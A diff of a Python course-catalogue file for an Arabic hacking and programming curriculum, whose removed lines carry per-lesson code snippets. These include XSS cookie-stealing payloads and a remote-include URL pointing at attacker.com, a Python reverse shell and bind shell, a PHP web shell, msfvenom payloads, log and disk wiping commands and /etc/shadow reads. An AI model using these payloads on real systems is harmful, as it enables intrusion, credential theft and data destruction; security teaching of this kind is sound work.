+    {"id": "python8", "name": "Python - التعامل مع الملفات", "level": "متوسط", "duration": "2.5 ساعات", "category": "البرمجة"},
+    {"id": "python9", "name": "Python - المكتبات الشائعة", "level": "متوسط", "duration": "3 ساعات", "category": "البرمجة"},
+    {"id": "python10", "name": "Python - التعامل مع قواعد البيانات", "level": "متقدم", "duration": "4 ساعات", "category": "البرمجة"},
+    {"id": "cpp1", "name": "C++ - أساسيات اللغة", "level": "مبتدئ", "duration": "3 ساعات", "category": "البرمجة"},
+    {"id": "cpp2", "name": "C++ - المتغيرات والعمليات", "level": "مبتدئ", "duration": "2 ساعات", "category": "البرمجة"},
+    {"id": "cpp3", "name": "C++ - الحلقات والشرط", "level": "مبتدئ", "duration": "2.5 ساعات", "category": "البرمجة"},
+    {"id": "cpp4", "name": "C++ - الدوال والبرمجة", "level": "متوسط", "duration": "3 ساعات", "category": "البرمجة"},
+    {"id": "cpp5", "name": "C++ - البرمجة الكائنية", "level": "متوسط", "duration": "4 ساعات", "category": "البرمجة"},
+    {"id": "cpp6", "name": "C++ - المؤشرات والذاكرة", "level": "متقدم", "duration": "4 ساعات", "category": "البرمجة"},
+    {"id": "cpp7", "name": "C++ - التعامل مع الملفات", "level": "متوسط", "duration": "2.5 ساعات", "category": "البرمجة"},
+    {"id": "cpp8", "name": "C++ - STL والحاويات", "level": "متقدم", "duration": "4 ساعات", "category": "البرمجة"},
+    {"id": "js1", "name": "JavaScript - أساسيات", "level": "مبتدئ", "duration": "3 ساعات", "category": "البرمجة"},
+    {"id": "js2", "name": "JavaScript - الدوال والسهمية", "level": "متوسط", "duration": "2 ساعات", "category": "البرمجة"},
+    {"id": "js3", "name": "JavaScript - DOM والتعامل مع الصفحة", "level": "متوسط", "duration": "3 ساعات", "category": "البرمجة"},
+    {"id": "js4", "name": "JavaScript - Ajax و Fetch", "level": "متوسط", "duration": "3 ساعات", "category": "البرمجة"},
+    {"id": "js5", "name": "JavaScript - Promises و Async", "level": "متقدم", "duration": "3 ساعات", "category": "البرمجة"},
+    {"id": "js6", "name": "JavaScript - OOP في JavaScript", "level": "متقدم", "duration": "3 ساعات", "category": "البرمجة"},
+    {"id": "assembly1", "name": "Assembly - مقدمة", "level": "متقدم", "duration": "3 ساعات", "category": "البرمجة"},
+    {"id": "assembly2", "name": "Assembly - العمليات الحسابية", "level": "متقدم", "duration": "3 ساعات", "category": "البرمجة"},
+    {"id": "bash1", "name": "Bash - أساسيات", "level": "مبتدئ", "duration": "2 ساعات", "category": "البرمجة"},
+    {"id": "bash2", "name": "Bash - الحلقات والشروط", "level": "متوسط", "duration": "2.5 ساعات", "category": "البرمجة"},
+    {"id": "bash3", "name": "Bash - إدارة الملفات والأنظمة", "level": "متوسط", "duration": "2.5 ساعات", "category": "البرمجة"},
+    {"id": "bash4", "name": "Bash - الأتمتة والـ Cron Jobs", "level": "متقدم", "duration": "3 ساعات", "category": "البرمجة"},
 ]
 
 # ===== 2. اختبار الاختراق (40 درس) =====
 pentest_courses = [
-    {"id": "recon1", "name": "جمع المعلومات - أساسيات", "level": "مبتدئ", "duration": "2 ساعات", "category": "اختبار الاختراق", "code": "# جمع المعلومات الأساسي\nwhois example.com\nnslookup example.com\ndig example.com"},
-    {"id": "recon2", "name": "جمع المعلومات - Google Dorks", "level": "متوسط", "duration": "2 ساعات", "category": "اختبار الاختراق", "code": "# Google Dorks\nsite:example.com filetype:pdf\nintitle:'index of' /password\ninurl:admin/login.php"},
-    {"id": "recon3", "name": "جمع المعلومات - Shodan", "level": "متوسط", "duration": "2.5 ساعات", "category": "اختبار الاختراق", "code": "# Shodan Search\nshodan search 'apache' --limit 10\nshodan host 1.1.1.1"},
-    {"id": "recon4", "name": "جمع المعلومات - الأفراد", "level": "متوسط", "duration": "2 ساعات", "category": "اختبار الاختراق", "code": "# OSINT على الأفراد\ntheHarvester -d example.com -l 500 -b google\nsherlock username"},
-    {"id": "scanning1", "name": "مسح الشبكات - Nmap أساسي", "level": "مبتدئ", "duration": "2 ساعات", "category": "اختبار الاختراق", "code": "nmap -T4 -F 192.168.1.0/24\nnmap -sV 192.168.1.100"},
-    {"id": "scanning2", "name": "مسح الشبكات - Nmap متقدم", "level": "متوسط", "duration": "3 ساعات", "category": "اختبار الاختراق", "code": "nmap -p- -sC -sV 192.168.1.100\nnmap -sU 192.168.1.100\nnmap -f -D RND:10 192.168.1.100"},
-    {"id": "scanning3", "name": "مسح الشبكات - Masscan", "level": "متوسط", "duration": "2 ساعات", "category": "اختبار الاختراق", "code": "masscan 192.168.1.0/24 -p1-65535 --rate=1000\nmasscan 192.168.1.100 -p80,443,8080"},
-    {"id": "scanning4", "name": "مسح الشبكات - اكتشاف الخدمات", "level": "متوسط", "duration": "2.5 ساعات", "category": "اختبار الاختراق", "code": "nmap -sV --version-intensity 9 192.168.1.100\nnmap -O 192.168.1.100"},
-    {"id": "exploit1", "name": "SQL Injection - أساسيات", "level": "متوسط", "duration": "3 ساعات", "category": "اختبار الاختراق", "code": "sqlmap -u 'http://target.com?id=1' --dbs\n' OR '1'='1'\n' UNION SELECT username,password FROM users--"},
-    {"id": "exploit2", "name": "SQL Injection - متقدم", "level": "متقدم", "duration": "4 ساعات", "category": "اختبار الاختراق", "code": "sqlmap -u 'http://target.com?id=1' --dbs --tables --columns --dump\nsqlmap -u 'http://target.com?id=1' --os-shell"},
-    {"id": "exploit3", "name": "XSS - هجمات عبر المواقع", "level": "متوسط", "duration": "2.5 ساعات", "category": "اختبار الاختراق", "code": "<script>alert('XSS')</script>\n<img src=x onerror=alert('XSS')>\n<svg/onload=alert('XSS')>"},
-    {"id": "exploit4", "name": "XSS - متقدم والاستغلال", "level": "متقدم", "duration": "3 ساعات", "category": "اختبار الاختراق", "code": "<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>\n<script>new Image().src='http://attacker.com/steal?c='+document.cookie</script>"},
-    {"id": "exploit5", "name": "CSRF - هجمات", "level": "متوسط", "duration": "2 ساعات", "category": "اختبار الاختراق", "code": "<form action='http://target.com/transfer' method='POST'>\n<input type='hidden' name='amount' value='1000'>\n</form>"},
-    {"id": "exploit6", "name": "File Inclusion - LFI/RFI", "level": "متقدم", "duration": "3 ساعات", "category": "اختبار الاختراق", "code": "?page=../../../../etc/passwd\n?page=http://attacker.com/shell.txt\n?page=php://filter/convert.base64-encode/resource=index.php"},
-    {"id": "exploit7", "name": "Command Injection", "level": "متقدم", "duration": "2.5 ساعات", "category": "اختبار الاختراق", "code": "; ls -la\n| whoami\n& id\n|| echo 'Injected'"},
-    {"id": "exploit8", "name": "Buffer Overflow - أساسيات", "level": "متقدم", "duration": "4 ساعات", "category": "اختبار الاختراق", "code": "# Buffer Overflow مثال\nchar buffer[64];\ngets(buffer); // غير آمن\n# تجاوز السعة لتغيير تنفيذ البرنامج"},
-    {"id": "exploit9", "name": "Buffer Overflow - استغلال", "level": "خبير", "duration": "5 ساعات", "category": "اختبار الاختراق", "code": "# استغلال Buffer Overflow\npython exploit.py --target 192.168.1.100 --port 4444\n# حقن شل كود وتجاوز الحماية"},
-    {"id": "exploit10", "name": "الهندسة الاجتماعية", "level": "متوسط", "duration": "2 ساعات", "category": "اختبار الاختراق", "code": "# تقنيات الهندسة الاجتماعية\n# Phishing Email\n# Spear Phishing\n# Tailgating\n# Pretexting"},
-    {"id": "post1", "name": "ما بعد الاختراق - رفع الصلاحيات", "level": "متقدم", "duration": "3 ساعات", "category": "اختبار الاختراق", "code": "sudo -l\nfind / -perm -4000 2>/dev/null\nls -la /etc/passwd\nuname -a\nsearchsploit kernel"},
-    {"id": "post2", "name": "ما بعد الاختراق - التخفي", "level": "متقدم", "duration": "3 ساعات", "category": "اختبار الاختراق", "code": "echo '' > ~/.bash_history\nrm -rf /var/log/*\nhidepid -p 1234\nrootkit"},
-    {"id": "post3", "name": "ما بعد الاختراق - جمع المعلومات", "level": "متقدم", "duration": "2.5 ساعات", "category": "اختبار الاختراق", "code": "cat /etc/passwd\ncat /etc/shadow\nnetstat -tuln\nps aux\nifconfig"},
-    {"id": "post4", "name": "ما بعد الاختراق - الحفاظ على الوصول", "level": "خبير", "duration": "3 ساعات", "category": "اختبار الاختراق", "code": "# تثبيت باب خلفي\ncron -e\nsystemctl enable backdoor\n# استخدام شهادات SSH"},
-    {"id": "post5", "name": "ما بعد الاختراق - التنقل الداخلي", "level": "متقدم", "duration": "2.5 ساعات", "category": "اختبار الاختراق", "code": "nmap -sP 192.168.1.0/24\narp -a\nroute -n\nnet view"},
-    {"id": "post6", "name": "ما بعد الاختراق - البيانات الحساسة", "level": "متقدم", "duration": "2 ساعات", "category": "اختبار الاختراق", "code": "grep -r 'password' /var/www/\nfind . -name '*.conf' | xargs grep 'password'\nfind . -name '*.sql'"},
-    {"id": "post7", "name": "ما بعد الاختراق - حرق الآثار", "level": "متقدم", "duration": "2 ساعات", "category": "اختبار الاختراق", "code": "history -c\nshred -f -z -u file.log\nwipefs /dev/sda1\ndd if=/dev/zero of=/dev/sda1 bs=512 count=1"},
-    {"id": "wifi1", "name": "اختراق Wi-Fi - أساسيات", "level": "متوسط", "duration": "3 ساعات", "category": "اختبار الاختراق", "code": "airodump-ng wlan0mon\naireplay-ng -0 5 -a MAC wlan0mon\naircrack-ng -w wordlist.txt capture.cap"},
-    {"id": "wifi2", "name": "اختراق Wi-Fi - WPA/WPA2", "level": "متقدم", "duration": "4 ساعات", "category": "اختبار الاختراق", "code": "airmon-ng start wlan0\naireplay-ng -0 0 -a MAC wlan0mon\naircrack-ng -w rockyou.txt handshake.cap"},
-    {"id": "wifi3", "name": "اختراق Wi-Fi - هجمات متقدمة", "level": "خبير", "duration": "4 ساعات", "category": "اختبار الاختراق", "code": "pmkid -t wlan0mon\nhashcat -m 16800 pmkid.hcap rockyou.txt\neapol -t wlan0mon --pmkid"},
-    {"id": "mobile1", "name": "اختراق Android - أساسيات", "level": "متوسط", "duration": "3 ساعات", "category": "اختبار الاختراق", "code": "msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -o payload.apk\nmsfconsole"},
-    {"id": "mobile2", "name": "اختراق Android - متقدم", "level": "متقدم", "duration": "4 ساعات", "category": "اختبار الاختراق", "code": "adb shell\nsu\ncat /data/data/com.example/databases/*\ndump系统"},
-    {"id": "web1", "name": "اختراق الويب - أساسيات", "level": "متوسط", "duration": "3 ساعات", "category": "اختبار الاختراق", "code": "curl -X GET 'http://target.com/api'\ncurl -X POST 'http://target.com/login' -d 'user=admin&pass=123'"},
-    {"id": "web2", "name": "اختراق الويب - الاستغلال", "level": "متقدم", "duration": "4 ساعات", "category": "اختبار الاختراق", "code": "# استغلال ثغرات الويب\n# CSRF, XSS, SQLi, File Upload\n# RCE, LFI, RFI"},
-    {"id": "web3", "name": "اختراق الويب - أتمتة", "level": "متقدم", "duration": "3 ساعات", "category": "اختبار الاختراق", "code": "import requests\ndef exploit(url):\n    try:\n        r = requests.get(url)\n        if 'admin' in r.text:\n            print('[+] نجاح!')\n    except: pass"},
-    {"id": "network1", "name": "اختراق الشبكات - MITM", "level": "متقدم", "duration": "3 ساعات", "category": "اختبار الاختراق", "code": "ettercap -T -M arp:remote /target1// /target2//\narpspoof -i eth0 -t target1 target2"},
-    {"id": "network2", "name": "اختراق الشبكات - DNS Spoofing", "level": "متقدم", "duration": "2.5 ساعات", "category": "اختبار الاختراق", "code": "dnsspoof -i eth0 -f hostfile\n# تحويل example.com إلى 192.168.1.50"},
-    {"id": "network3", "name": "اختراق الشبكات - Packet Sniffing", "level": "متوسط", "duration": "3 ساعات", "category": "اختبار الاختراق", "code": "tcpdump -i eth0 -w capture.pcap\nwireshark capture.pcap\n# تحليل الحزم"},
-    {"id": "crypto1", "name": "التشفير - أساسيات", "level": "متوسط", "duration": "2 ساعات", "category": "اختبار الاختراق", "code": "openssl enc -aes-256-cbc -salt -in file.txt -out file.enc\nopenssl enc -d -aes-256-cbc -in file.enc -out file.txt"},
-    {"id": "crypto2", "name": "كسر التشفير - هجمات", "level": "متقدم", "duration": "3 ساعات", "category": "اختبار الاختراق", "code": "hashcat -m 0 -a 0 hash.txt rockyou.txt\njohn --wordlist=rockyou.txt hash.txt"},
-    {"id": "crypto3", "name": "التشفير - المفاتيح والشهادات", "level": "متقدم", "duration": "2.5 ساعات", "category": "اختبار الاختراق", "code": "openssl genrsa -out private.key 2048\nopenssl rsa -in private.key -pubout -out public.key\nopenssl req -new -key private.key -out request.csr"},
+    {"id": "recon1", "name": "جمع المعلومات - أساسيات", "level": "مبتدئ", "duration": "2 ساعات", "category": "اختبار الاختراق"},
+    {"id": "recon2", "name": "جمع المعلومات - Google Dorks", "level": "متوسط", "duration": "2 ساعات", "category": "اختبار الاختراق"},
+    {"id": "recon3", "name": "جمع المعلومات - Shodan", "level": "متوسط", "duration": "2.5 ساعات", "category": "اختبار الاختراق"},
+    {"id": "recon4", "name": "جمع المعلومات - الأفراد", "level": "متوسط", "duration": "2 ساعات", "category": "اختبار الاختراق"},
+    {"id": "scanning1", "name": "مسح الشبكات - Nmap أساسي", "level": "مبتدئ", "duration": "2 ساعات", "category": "اختبار الاختراق"},
+    {"id": "scanning2", "name": "مسح الشبكات - Nmap متقدم", "level": "متوسط", "duration": "3 ساعات", "category": "اختبار الاختراق"},
+    {"id": "scanning3", "name": "مسح الشبكات - Masscan", "level": "متوسط", "duration": "2 ساعات", "category": "اختبار الاختراق"},
+    {"id": "scanning4", "name": "مسح الشبكات - اكتشاف الخدمات", "level": "متوسط", "duration": "2.5 ساعات", "category": "اختبار الاختراق"},
+    {"id": "exploit1", "name": "SQL Injection - أساسيات", "level": "متوسط", "duration": "3 ساعات", "category": "اختبار الاختراق"},
+    {"id": "exploit2", "name": "SQL Injection - متقدم", "level": "متقدم", "duration": "4 ساعات", "category": "اختبار الاختراق"},
+    {"id": "exploit3", "name": "XSS - هجمات عبر المواقع", "level": "متوسط", "duration": "2.5 ساعات", "category": "اختبار الاختراق"},
+    {"id": "exploit4", "name": "XSS - متقدم والاستغلال", "level": "متقدم", "duration": "3 ساعات", "category": "اختبار الاختراق"},
+    {"id": "exploit5", "name": "CSRF - هجمات", "level": "متوسط", "duration": "2 ساعات", "category": "اختبار الاختراق"},
+    {"id": "exploit6", "name": "File Inclusion - LFI/RFI", "level": "متقدم", "duration": "3 ساعات", "category": "اختبار الاختراق"},
+    {"id": "exploit7", "name": "Command Injection", "level": "متقدم", "duration": "2.5 ساعات", "category": "اختبار الاختراق"},
+    {"id": "exploit8", "name": "Buffer Overflow - أساسيات", "level": "متقدم", "duration": "4 ساعات", "category": "اختبار الاختراق"},
+    {"id": "exploit9", "name": "Buffer Overflow - استغلال", "level": "خبير", "duration": "5 ساعات", "category": "اختبار الاختراق"},
+    {"id": "exploit10", "name": "الهندسة الاجتماعية", "level": "متوسط", "duration": "2 ساعات", "category": "اختبار الاختراق"},
+    {"id": "post1", "name": "ما بعد الاختراق - رفع الصلاحيات", "level": "متقدم", "duration": "3 ساعات", "category": "اختبار الاختراق"},
+    {"id": "post2", "name": "ما بعد الاختراق - التخفي", "level": "متقدم", "duration": "3 ساعات", "category": "اختبار الاختراق"},
+    {"id": "post3", "name": "ما بعد الاختراق - جمع المعلومات", "level": "متقدم", "duration": "2.5 ساعات", "category": "اختبار الاختراق"},
+    {"id": "post4", "name": "ما بعد الاختراق - الحفاظ على الوصول", "level": "خبير", "duration": "3 ساعات", "category": "اختبار الاختراق"},
+    {"id": "post5", "name": "ما بعد الاختراق - التنقل الداخلي", "level": "متقدم", "duration": "2.5 ساعات", "category": "اختبار الاختراق"},
+    {"id": "post6", "name": "ما بعد الاختراق - البيانات الحساسة", "level": "متقدم", "duration": "2 ساعات", "category": "اختبار الاختراق"},
+    {"id": "post7", "name": "ما بعد الاختراق - حرق الآثار", "level": "متقدم", "duration": "2 ساعات", "category": "اختبار الاختراق"},
+    {"id": "wifi1", "name": "اختراق Wi-Fi - أساسيات", "level": "متوسط", "duration": "3 ساعات", "category": "اختبار الاختراق"},
+    {"id": "wifi2", "name": "اختراق Wi-Fi - WPA/WPA2", "level": "متقدم", "duration": "4 ساعات", "category": "اختبار الاختراق"},
+    {"id": "wifi3", "name": "اختراق Wi-Fi - هجمات متقدمة", "level": "خبير", "duration": "4 ساعات", "category": "اختبار الاختراق"},
+    {"id": "mobile1", "name": "اختراق Android - أساسيات", "level": "متوسط", "duration": "3 ساعات", "category": "اختبار الاختراق"},
+    {"id": "mobile2", "name": "اختراق Android - متقدم", "level": "متقدم", "duration": "4 ساعات", "category": "اختبار الاختراق"},
+    {"id": "web1", "name": "اختراق الويب - أساسيات", "level": "متوسط", "duration": "3 ساعات", "category": "اختبار الاختراق"},
+    {"id": "web2", "name": "اختراق الويب - الاستغلال", "level": "متقدم", "duration": "4 ساعات", "category": "اختبار الاختراق"},
+    {"id": "web3", "name": "اختراق الويب - أتمتة", "level": "متقدم", "duration": "3 ساعات", "category": "اختبار الاختراق"},
+    {"id": "network1", "name": "اختراق الشبكات - MITM", "level": "متقدم", "duration": "3 ساعات", "category": "اختبار الاختراق"},
+    {"id": "network2", "name": "اختراق الشبكات - DNS Spoofing", "level": "متقدم", "duration": "2.5 ساعات", "category": "اختبار الاختراق"},
+    {"id": "network3", "name": "اختراق الشبكات - Packet Sniffing", "level": "متوسط", "duration": "3 ساعات", "category": "اختبار الاختراق"},
+    {"id": "crypto1", "name": "التشفير - أساسيات", "level": "متوسط", "duration": "2 ساعات", "category": "اختبار الاختراق"},
+    {"id": "crypto2", "name": "كسر التشفير - هجمات", "level": "متقدم", "duration": "3 ساعات", "category": "اختبار الاختراق"},
+    {"id": "crypto3", "name": "التشفير - المفاتيح والشهادات", "level": "متقدم", "duration": "2.5 ساعات", "category": "اختبار الاختراق"},
 ]
 
 # ===== 3. الأدوات (44 درس) =====
 tools_courses = [
-    {"id": "metasploit1", "name": "Metasploit - أساسيات", "level": "متوسط", "duration": "3 ساعات", "category": "الأدوات", "code": "msfconsole\nuse exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS 192.168.1.100\nset PAYLOAD windows/x64/meterpreter/reverse_tcp"},
-    {"id": "metasploit2", "name": "Metasploit - حمولات", "level": "متقدم", "duration": "3 ساعات", "category": "الأدوات", "code": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o payload.exe\nmsfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -o payload.apk"},
-    {"id": "metasploit3", "name": "Metasploit - متقدم", "level": "خبير", "duration": "4 ساعات", "category": "الأدوات", "code": "use auxiliary/scanner/http/dir_scanner\nset RHOSTS 192.168.1.0/24\nuse post/windows/gather/hashdump\nload kiwi"},
-    {"id": "metasploit4", "name": "Metasploit - الأتمتة", "level": "خبير", "duration": "3 ساعات", "category": "الأدوات", "code": "resource script.rc\nspool /tmp/output.txt\nsetg RHOSTS 192.168.1.100\nrun -j"},
-    {"id": "nmap1", "name": "Nmap - أساسيات", "level": "مبتدئ", "duration": "2 ساعات", "category": "الأدوات", "code": "nmap -T4 -F 192.168.1.0/24\nnmap -sV 192.168.1.100\nnmap -O 192.168.1.100"},
-    {"id": "nmap2", "name": "Nmap - متقدم", "level": "متوسط", "duration": "3 ساعات", "category": "الأدوات", "code": "nmap -p- -sC -sV 192.168.1.100\nnmap -sU 192.168.1.100\nnmap -f -D RND:10 192.168.1.100"},
-    {"id": "nmap3", "name": "Nmap - NSE Scripts", "level": "متقدم", "duration": "3 ساعات", "category": "الأدوات", "code": "nmap --script vuln 192.168.1.100\nnmap --script http-enum 192.168.1.100\nnmap --script smb-enum-shares 192.168.1.100"},
-    {"id": "burp1", "name": "Burp Suite - أساسيات", "level": "متوسط", "duration": "3 ساعات", "category": "الأدوات", "code": "# إعداد الـ Proxy\n# التقاط الطلبات\n# Repeater\n# Intruder\n# Scanner"},
-    {"id": "burp2", "name": "Burp Suite - هجمات", "level": "متقدم", "duration": "4 ساعات", "category": "الأدوات", "code": "# SQL Injection مع Burp\n# XSS مع Burp\n# CSRF مع Burp\n# التلاعب بالـ Cookies"},
-    {"id": "burp3", "name": "Burp Suite - المتقدم", "level": "خبير", "duration": "4 ساعات", "category": "الأدوات", "code": "# استخدام Burp Extensions\n# BApp Store\n# Turbo Intruder\n# Collaboration"},
-    {"id": "wireshark1", "name": "Wireshark - أساسيات", "level": "متوسط", "duration": "2.5 ساعات", "category": "الأدوات", "code": "# التقاط الحزم\n# تحليل الـ HTTP\n# تصفية الـ TCP/UDP\n# تتبع الـ Streams"},
-    {"id": "wireshark2", "name": "Wireshark - تحليل متقدم", "level": "متقدم", "duration": "3 ساعات", "category": "الأدوات", "code": "wireshark -i eth0 -k\n# تصفية: http.request\n# تصفية: tcp.port == 443\n# تصفية: ip.addr == 192.168.1.100"},
-    {"id": "wireshark3", "name": "Wireshark - اكتشاف الهجمات", "level": "متقدم", "duration": "3 ساعات", "category": "الأدوات", "code": "# اكتشاف هجمات ARP Spoofing\n# اكتشاف هجمات DDoS\n# اكتشاف هجمات Port Scanning"},
-    {"id": "payload1", "name": "الحمولات - Reverse Shell", "level": "متقدم", "duration": "3 ساعات", "category": "الأدوات", "code": "# Reverse Shell في Python\nimport socket, subprocess, os\ns = socket.socket()\ns.connect(('192.168.1.50',4444))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\nsubprocess.call(['/bin/sh','-i'])"},
-    {"id": "payload2", "name": "الحمولات - Web Shell", "level": "متقدم", "duration": "2.5 ساعات", "category": "الأدوات", "code": "<?php\nif(isset($_GET['cmd'])){\n    system($_GET['cmd']);\n}\n?>\n# استخدام: shell.php?cmd=ls -la"},
-    {"id": "payload3", "name": "الحمولات - Bind Shell", "level": "متقدم", "duration": "3 ساعات", "category": "الأدوات", "code": "# Bind Shell في Python\nimport socket, subprocess\ns = socket.socket()\ns.bind(('0.0.0.0',4444))\ns.listen(5)\nwhile True:\n    client,addr = s.accept()\n    while True:\n        cmd = client.recv(1024).decode()\n        output = subprocess.getoutput(cmd)\n        client.send(output.encode())"},
-    {"id": "payload4", "name": "الحمولات - مخصصة", "level": "خبير", "duration": "4 ساعات", "category": "الأدوات", "code": "# حمولة مخصصة لتجاوز الحماية\n# استخدام Polymorphic Code\n# استخدام Encryption\n# استخدام Anti-VM Techniques"},
-    {"id": "payload5", "name": "الحمولات - في C", "level": "خبير", "duration": "4 ساعات", "category": "الأدوات", "code": "# Shellcode في C\n#include <stdio.h>\nunsigned char shellcode[] = '...';\nint main() {\n    void (*code)() = (void(*)())shellcode;\n    code();\n}"},
-    {"id": "hydra1", "name": "Hydra - كسر كلمات المرور", "level": "متوسط", "duration": "2 ساعات", "category": "الأدوات", "code": "hydra -l admin -P wordlist.txt ssh://192.168.1.100\nhydra -L users.txt -P passwords.txt ftp://192.168.1.100\nhydra -l admin -P wordlist.txt http-post-form '/login:user=^USER^&pass=^PASS^:F=incorrect'"},
-    {"id": "john1", "name": "John the Ripper", "level": "متوسط", "duration": "2 ساعات", "category": "الأدوات", "code": "john --wordlist=rockyou.txt hash.txt\njohn --format=md5 hash.txt\njohn --show hash.txt\njohn --incremental hash.txt"},
-    {"id": "aircrack1", "name": "Aircrack-ng - Wi-Fi", "level": "متوسط", "duration": "3 ساعات", "category": "الأدوات", "code": "airmon-ng start wlan0\nairodump-ng wlan0mon\naireplay-ng -0 5 -a MAC wlan0mon\naircrack-ng -w wordlist.txt capture.cap"},
-    {"id": "sqlmap1", "name": "SQLmap - أساسيات", "level": "متوسط", "duration": "2.5 ساعات", "category": "الأدوات", "code": "sqlmap -u 'http://target.com?id=1' --dbs\nsqlmap -u 'http://target.com?id=1' --tables\nsqlmap -u 'http://target.com?id=1' --columns -T users\nsqlmap -u 'http://target.com?id=1' --dump"},
-    {"id": "sqlmap2", "name": "SQLmap - متقدم", "level": "متقدم", "duration": "3 ساعات", "category": "الأدوات", "code": "sqlmap -u 'http://target.com?id=1' --os-shell\nsqlmap -u 'http://target.com?id=1' --file-read /etc/passwd\nsqlmap -u 'http://target.com?id=1' --tamper=space2comment"},
-    {"id": "beef1", "name": "BeEF - استغلال المتصفح", "level": "متقدم", "duration": "3 ساعات", "category": "الأدوات", "code": "# BeEF Hook\n<script src='http://beef:3000/hook.js'></script>\n# استغلال المتصفحات\n# سرقة الكوكيز\n# التقاط الضغطات"},
-    {"id": "social1", "name": "Social-Engineer Toolkit", "level": "متوسط", "duration": "3 ساعات", "category": "الأدوات", "code": "setoolkit\n# هجوم Phishing\n# هجوم Credential Harvester\n# هجوم Tabnabbing"},
-    {"id": "maltego1", "name": "Maltego - OSINT", "level": "متوسط", "duration": "2.5 ساعات", "category": "الأدوات", "code": "# جمع المعلومات\n# تحليل العلاقات\n# البحث عن الأفراد\n# البحث عن الشركات"},
-    {"id": "reconng1", "name": "Recon-ng - OSINT", "level": "متوسط", "duration": "2 ساعات", "category": "الأدوات", "code": "recon-ng\nmarketplace install all\nuse recon/domains-hosts/bing_domain_web\nset SOURCE example.com\nrun"},
-    {"id": "theharvester1", "name": "theHarvester - جمع البريد", "level": "مبتدئ", "duration": "1.5 ساعات", "category": "الأدوات", "code": "theHarvester -d example.com -b google\n theHarvester -d example.com -b linkedin\n theHarvester -d example.com -b twitter"},
-    {"id": "sherlock1", "name": "Sherlock - أفراد", "level": "مبتدئ", "duration": "1.5 ساعات", "category": "الأدوات", "code": "sherlock username\nsherlock -p username\n# البحث عن حسابات المستخدمين"},
-    {"id": "gobuster1", "name": "Gobuster - مسح الدلائل", "level": "متوسط", "duration": "2 ساعات", "category": "الأدوات", "code": "gobuster dir -u http://target.com -w common.txt\ngobuster dns -d example.com -w subdomains.txt\ngobuster dir -u http://target.com -w big.txt -x php,html,txt"},
-    {"id": "ffuf1", "name": "FFUF - مسح سريع", "level": "متوسط", "duration": "2 ساعات", "category": "الأدوات", "code": "ffuf -u http://target.com/FUZZ -w wordlist.txt\nffuf -u http://target.com/FUZZ -w wordlist.txt -fc 404\nffuf -u http://target.com/FUZZ -w wordlist.txt -e .php,.html"},
-    {"id": "nikto1", "name": "Nikto - مسح الثغرات", "level": "متوسط", "duration": "2 ساعات", "category": "الأدوات", "code": "nikto -h http://target.com\nnikto -h http://target.com -ssl\nnikto -h http://target.com -Tuning 9"},
-    {"id": "wpscan1", "name": "WPScan - WordPress", "level": "متوسط", "duration": "2.5 ساعات", "category": "الأدوات", "code": "wpscan --url http://target.com\nwpscan --url http://target.com --enumerate u\nwpscan --url http://target.com --plugins-detection aggressive"},
-    {"id": "droopescan1", "name": "Droopescan - Drupal", "level": "متوسط", "duration": "2 ساعات", "category": "الأدوات", "code": "droopescan scan drupal -u http://target.com\ndroopescan scan drupal -u http://target.com --full\ndroopescan scan drupal -u http://target.com --show"},
-    {"id": "joomscan1", "name": "Joomscan - Joomla", "level": "متوسط", "duration": "2 ساعات", "category": "الأدوات", "code": "joomscan -u http://target.com\njoomscan -u http://target.com --enumerate-components\njoomscan -u http://target.com --enumerate-exploits"},
-    {"id": "nuclei1", "name": "Nuclei - ثغرات", "level": "متقدم", "duration": "2.5 ساعات", "category": "الأدوات", "code": "nuclei -u http://target.com\nnuclei -u http://target.com -t cves/\nnuclei -u http://target.com -severity critical"},
-    {"id": "katana1", "name": "Katana - الزحف", "level": "متوسط", "duration": "2 ساعات", "category": "الأدوات", "code": "katana -u http://target.com\nkatana -u http://target.com -depth 3\nkatana -u http://target.com -js-crawler"},
-    {"id": "wayback1", "name": "Wayback Machine - الأرشيف", "level": "مبتدئ", "duration": "1.5 ساعات", "category": "الأدوات", "code": "waybackurls example.com\nwaybackurls example.com | grep '.php'\ncurl 'https://web.archive.org/cdx/search/cdx?url=example.com/*'"},
-    {"id": "shodan1", "name": "Shodan - متقدم", "level": "متوسط", "duration": "2.5 ساعات", "category": "الأدوات", "code": "shodan search 'apache' --limit 100\nshodan host 1.1.1.1\nshodan myip\nshodan download result.json.gz"},
-    {"id": "censys1", "name": "Censys - المسح", "level": "متوسط", "duration": "2 ساعات", "category": "الأدوات", "code": "# Censys API\nimport censys\nc = censys.ipv4.CensysIPv4()\nc.view('1.1.1.1')"},
-    {"id": "zoomeye1", "name": "ZoomEye - المسح", "level": "متوسط", "duration": "2 ساعات", "category": "الأدوات", "code": "# ZoomEye API\nimport zoomeye\nz = zoomeye.ZoomEye()\nz.dork('apache')"},
-    {"id": "binary1", "name": "Binary Analysis - التحليل", "level": "خبير", "duration": "4 ساعات", "category": "الأدوات", "code": "# تحليل الملفات الثنائية\nobjdump -d binary\nradare2 binary\nstrings binary\nltrace ./binary"},
-    {"id": "debugger1", "name": "Debugging - التصحيح", "level": "خبير", "duration": "4 ساعات", "category": "الأدوات", "code": "gdb ./binary\nbreak main\nrun\ninfo registers\nx/10x $esp"},
+    {"id": "metasploit1", "name": "Metasploit - أساسيات", "level": "متوسط", "duration": "3 ساعات", "category": "الأدوات"},
+    {"id": "metasploit2", "name": "Metasploit - حمولات", "level": "متقدم", "duration": "3 ساعات", "category": "الأدوات"},
+    {"id": "metasploit3", "name": "Metasploit - متقدم", "level": "خبير", "duration": "4 ساعات", "category": "الأدوات"},
+    {"id": "metasploit4", "name": "Metasploit - الأتمتة", "level": "خبير", "duration": "3 ساعات", "category": "الأدوات"},
+    {"id": "nmap1", "name": "Nmap - أساسيات", "level": "مبتدئ", "duration": "2 ساعات", "category": "الأدوات"},
+    {"id": "nmap2", "name": "Nmap - متقدم", "level": "متوسط", "duration": "3 ساعات", "category": "الأدوات"},
+    {"id": "nmap3", "name": "Nmap - NSE Scripts", "level": "متقدم", "duration": "3 ساعات", "category": "الأدوات"},
